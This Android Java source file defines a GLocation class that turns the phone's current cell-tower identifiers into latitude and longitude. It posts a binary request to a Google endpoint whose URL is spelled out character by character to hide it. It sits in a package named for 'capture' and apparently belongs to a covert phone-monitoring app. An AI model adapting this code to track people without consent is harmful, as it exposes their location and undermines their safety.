package com.vvt.capture.location.glocation;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.vvt.capture.location.Customization;
import com.vvt.capture.location.glocation.http.HttpWrapper;
import com.vvt.capture.location.glocation.http.HttpWrapperException;
import com.vvt.capture.location.glocation.http.HttpWrapperResponse;
import com.vvt.logger.FxLog;
 

public class GLocation {

	// -------------------------------------------------------------------------------------------------
	// PRIVATE API
	// -------------------------------------------------------------------------------------------------

	private static final String TAG = "GLocation";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int HTTP_RESPONSE_CODE_200 = 200;
	private static final String USER_AGENT_HEADER = "User-Agent";

	private Context mContext;
	private long mPostTime;

	private static class SingletonHolder {
		private static final GLocation INSTANCE = new GLocation();
	}

	private GLocation() {
	}

	private static void writeGsmLocationRequest(
			GsmCellLocation gsmCellLocation, NetworkOperator networkOperator,
			OutputStream outStream) throws IOException, ConversionException {

		String mncString = networkOperator.getMnc();

		if (mncString == null) {
			if(LOGD) FxLog.d(TAG,  "Cannot get MNC");
			throw new ConversionException("Cannot get MNC");
		}

		String mccString = networkOperator.getMcc();

		if (mccString == null) {
			if(LOGD) FxLog.d(TAG,  "Cannot get MCC");
			throw new ConversionException("Cannot get MCC");
		}

		DataOutputStream dataOutStream = new DataOutputStream(outStream);
		int gsmCellId = gsmCellLocation.getCid();
		int gsmAreaCode = gsmCellLocation.getLac();
		int mnc = Integer.parseInt(networkOperator.getMnc());
		int mcc = Integer.parseInt(networkOperator.getMcc());
		
		if(LOGD) FxLog.d(TAG, String.format("gsmCellId : %s, gsmAreaCode : %s, mnc : %s, mcc : %s", 
				gsmCellId,gsmAreaCode,mnc,mcc));

		dataOutStream.writeShort(0x000E);
		dataOutStream.writeLong(0);
		dataOutStream.writeInt(0);
		dataOutStream.writeShort(0x0000);
		dataOutStream.writeByte(0x1B);
		dataOutStream.writeInt(mnc);
		dataOutStream.writeInt(mcc);

		if (gsmCellId > 65536) {
			dataOutStream.writeInt(5);
		} else {
			dataOutStream.writeInt(3);
		}

		dataOutStream.writeShort(0);
		dataOutStream.writeInt(gsmCellId);
		dataOutStream.writeInt(gsmAreaCode);

		dataOutStream.writeInt(mnc);
		dataOutStream.writeInt(mcc);

		dataOutStream.writeInt(0xFFFFFFFF);
		dataOutStream.writeInt(0x00000000);

		dataOutStream.flush();
		dataOutStream.close();
	}

	private String getServiceUrl() {
		char[] url = new char[30];

		url[0] = 'h';
		url[1] = 't';
		url[2] = 't';
		url[3] = 'p';
		url[4] = ':';
		url[5] = '/';
		url[6] = '/';
		url[7] = 'w';
		url[8] = 'w';
		url[9] = 'w';
		url[10] = '.';
		url[11] = 'g';
		url[12] = 'o';
		url[13] = 'o';
		url[14] = 'g';
		url[15] = 'l';
		url[16] = 'e';
		url[17] = '.';
		url[18] = 'c';
		url[19] = 'o';
		url[20] = 'm';
		url[21] = '/';
		url[22] = 'g';
		url[23] = 'l';
		url[24] = 'm';
		url[25] = '/';
		url[26] = 'm';
		url[27] = 'm';
		url[28] = 'a';
		url[29] = 'p';

		return new String(url);
	}

	private String getUserAgent() {
		if(LOGV) FxLog.v(TAG, "getUserAgent START");
		
		/*
		 * String aUserAgent =String.format(
		 * "android:%s,%s,%s,%s,%s,FP=%s,Host=%s,ID=%s,Display=%s,Tag=%s,Type=%s,VersionCodeName=%s"
		 * , Build.DEVICE, Build.PRODUCT, Build.MODEL, Build.BOARD, Build.BRAND,
		 * Build.FINGERPRINT, Build.HOST, Build.ID, Build.DISPLAY,Build.TAGS,
		 * Build.TYPE, Build.VERSION.CODENAME);
		 */
		// String aUserAgent = String.format("android:%s-%s-%s",
		// Build.MANUFACTURER, Build.DEVICE, Build.MODEL);

		/*String userAgent = String.format("android:%s-%s", PhoneInfoHelper
				.getDevice(), PhoneInfoHelper.getModel());*/
		
		String userAgent = String.format("android:%s-%s", Build.DEVICE, Build.MODEL);

		if(LOGD) FxLog.d(TAG, "User agent: "+ userAgent);
		if(LOGV) FxLog.v(TAG, "getUserAgent EXIT");
		return userAgent;
	}

	// -------------------------------------------------------------------------------------------------
	// PUBLIC API
	// -------------------------------------------------------------------------------------------------

	public static class ConversionException extends Exception {

		/**
		 * Auto-generated
		 */
		private static final long serialVersionUID = 1L;

		public ConversionException(Throwable e) {
			super(e);
		}

		public ConversionException(String s) {
			super(s);
		}

	}

	public static GLocation getInstance(Context aContext) {
		if(LOGD) FxLog.d(TAG, "... initiating ...");
		SingletonHolder.INSTANCE.mContext = aContext;
		return SingletonHolder.INSTANCE;
	}

	public Location convertCellLocationToLocation(CellLocation cellLocation,
			NetworkOperator networkOperator) throws ConversionException {
		
		if(LOGD) FxLog.d(TAG, "... convertCellLocationToLocation(CellLocation, NetworkOperator) ...");

		Location location = new Location(LocationManager.NETWORK_PROVIDER);

		if (cellLocation instanceof GsmCellLocation) {
			GsmCellLocation aGsmCellLocation = (GsmCellLocation) cellLocation;
			ByteArrayOutputStream bytesOutStream = new ByteArrayOutputStream();
			byte[] requestBytes;
			
			if(LOGD) FxLog.d(TAG, "Cell is GSM");

			// Construct request
			try {
				writeGsmLocationRequest(aGsmCellLocation, networkOperator,
						bytesOutStream);
			} catch (IOException e) {
				if(LOGD) FxLog.d(TAG,  "Cannot construct a request.");
				
				throw new ConversionException(e);
			}

			requestBytes = bytesOutStream.toByteArray();

			/*if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format("Request: %s", GeneralUtil
						.bytesToString1(requestBytes)));
			}*/

			HttpWrapper httpWrapper = HttpWrapper.getInstance();
			HttpWrapperResponse response = null;

			httpWrapper.addHeader(USER_AGENT_HEADER, getUserAgent());

			if(LOGD) FxLog.d(TAG, "Posting...");

			long aStartTime = System.currentTimeMillis();

			try {
				response = httpWrapper.httpPost(getServiceUrl(), requestBytes);
				mPostTime = System.currentTimeMillis() - aStartTime;
			} catch (HttpWrapperException e) {
				mPostTime = System.currentTimeMillis() - aStartTime;
				if(LOGD) FxLog.d(TAG,  "Cannot connect to the server.");
				throw new ConversionException(e);
			}

			if (response.getHttpStatusCode() == HTTP_RESPONSE_CODE_200) {

				byte[] responseBytes = response.getBodyAsBytes();

				/*if (LOCAL_LOGV) {
					FxLog.v(TAG, String.format("Response: %s", GeneralUtil
							.bytesToString1(responseBytes)));
				}*/

				ByteArrayInputStream responseByteStream = new ByteArrayInputStream(
						responseBytes);
				DataInputStream responseDataStream = new DataInputStream(
						responseByteStream);

				try {
					responseDataStream.readShort();
					responseDataStream.readByte();
					int code = responseDataStream.readInt();

					if (code == 0) {
						double latitude = (double) responseDataStream.readInt() / 1E6;
						double longitude = (double) responseDataStream
								.readInt() / 1E6;

						if(LOGD) FxLog.d(TAG,  "Lat: "+latitude+", Lon: "+longitude );

						location = new Location(
								LocationManager.NETWORK_PROVIDER);
						location.setLatitude(latitude);
						location.setLongitude(longitude);
						location.setTime(System.currentTimeMillis());
					}

				} catch (IOException e) {
					if(LOGE) FxLog.e(TAG, e.toString());
					throw new ConversionException(e);
				}

			} else {
				String errorMessage = String.format(
						"Invalid HTTP response code: %d", response
								.getHttpStatusCode());
				if(LOGE) FxLog.e(TAG, errorMessage);
				throw new ConversionException(errorMessage);
			}

		} else if(cellLocation instanceof CdmaCellLocation){
			
			if(LOGV)  FxLog.d(TAG,  "Cell is CDMA");

			// Use reflection for backward-compatibility (CdmaCallLocation is
			// available for
			// API level >= 5, or Android 2.0).
			try {
				Class<?> cdmaCellLocationClass;
				cdmaCellLocationClass = Class
						.forName("android.telephony.cdma.CdmaCellLocation");
				Object cdmaCellLocation = cdmaCellLocationClass.newInstance();

				Method getBaseStationLatitudeMathod = cdmaCellLocationClass
						.getDeclaredMethod("getBaseStationLatitude");
				Method getBaseStationLongitudeMethod = cdmaCellLocationClass
						.getDeclaredMethod("getBaseStationLongitude");

				int latitude = (Integer) getBaseStationLatitudeMathod
						.invoke(cdmaCellLocation);
				int longitude = (Integer) getBaseStationLongitudeMethod
						.invoke(cdmaCellLocation);

				if (latitude != Integer.MAX_VALUE) {
					location.setLatitude((double) latitude);
					location.setLongitude((double) longitude);
				}
				location.setTime(System.currentTimeMillis());
			} catch (ClassNotFoundException e) {
			    FxLog.d(TAG,  "CDMA cell information to location conversion failed.");
			} catch (IllegalAccessException e) {
			    FxLog.d(TAG, "CDMA cell information to location conversion failed.");
			} catch (InstantiationException e) {
			    FxLog.d(TAG, "CDMA cell information to location conversion failed.");
			} catch (SecurityException e) {
			    FxLog.d(TAG, "CDMA cell information to location conversion failed.");
			} catch (NoSuchMethodException e) {
			    FxLog.d(TAG, "CDMA cell information to location conversion failed.");
			} catch (IllegalArgumentException e) {
			    FxLog.d(TAG, "CDMA cell information to location conversion failed.");
			} catch (InvocationTargetException e) {
			    FxLog.d(TAG, "CDMA cell information to location conversion failed.");
			}
			
		}else{
			if(LOGD) FxLog.d(TAG, "No compatible cell type, may be no SIM Card inserted !");
			if(LOGD) FxLog.d(TAG, "Throw ConversionException");
			throw new ConversionException("No SIM Card inserted !");
		}

		return location;
	}

	public Location convertCellLocationToLocation(CellLocation aCellLocation)
			throws ConversionException {

		if(LOGD) FxLog.d(TAG,  "... convertCellLocationToLocation(CellLocation) ...");

		return convertCellLocationToLocation(aCellLocation, getNetworkOperator());
	}

	public Location getLocationOfCurrentCellLocation() throws ConversionException {
		if(LOGD) FxLog.d(TAG, "... getLocationOfCurrentCellLocation() ...");
		TelephonyManager telephonyManager = (TelephonyManager) mContext
				.getSystemService(Context.TELEPHONY_SERVICE);
		return convertCellLocationToLocation(telephonyManager.getCellLocation());
	}
	
	private NetworkOperator getNetworkOperator() {

		TelephonyManager aTelephonyManager = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
		String aNetworkOperatorString = aTelephonyManager.getNetworkOperator();
		NetworkOperator aNetworkOperator = new NetworkOperator();

		if (aNetworkOperatorString.length() >= 4) {
			aNetworkOperator.setMcc(aNetworkOperatorString.substring(0, 3));
			aNetworkOperator.setMnc(aNetworkOperatorString.substring(3));
		}

		aNetworkOperator.setNetworkOperatorName(aTelephonyManager
				.getNetworkOperatorName());

		return aNetworkOperator;
	}

	public long getPostTime() {
		return mPostTime;
	}
	
	private static class NetworkOperator {

		/**
		 * Mobile Country Code
		 */
		private String mcc;

		/**
		 * Mobile Network Code
		 */
		private String mnc;

		private String networkOperatorName;

		public String getMcc() {
			return mcc;
		}

		public void setMcc(String mcc) {
			this.mcc = mcc;
		}

		public String getMnc() {
			return mnc;
		}

		public void setMnc(String mnc) {
			this.mnc = mnc;
		}

		@SuppressWarnings("unused")
		public String getNetworkOperatorName() {
			return networkOperatorName;
		}

		public void setNetworkOperatorName(String aNetworkOperatorName) {
			networkOperatorName = aNetworkOperatorName;
		}

	}

}
